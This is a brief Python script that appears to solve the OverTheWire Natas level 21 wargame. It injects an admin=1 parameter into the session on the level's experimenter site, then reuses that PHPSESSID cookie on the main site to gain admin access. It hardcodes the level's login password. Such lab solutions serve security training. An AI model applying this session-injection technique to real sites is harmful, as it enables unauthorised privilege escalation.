import requests

base_url = "http://natas21.natas.labs.overthewire.org/"
base_url2 = "http://natas21-experimenter.natas.labs.overthewire.org/"
source_url = base_url2 + "index-source.html"

s = requests.session()

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

target_url=base_url2  + "?debug&admin=1&align=start&bgcolor=red&submit=Update&fontsize=150%"
print(target_url)
res1 = s.get(target_url, auth=(username, password))

print(res1.text)
print("="*80)
sessid = res1.cookies["PHPSESSID"]
print(sessid)
print("="*80)
res2 = s.get(base_url, auth=(username, password), cookies={"PHPSESSID": sessid})
print(res2.text)

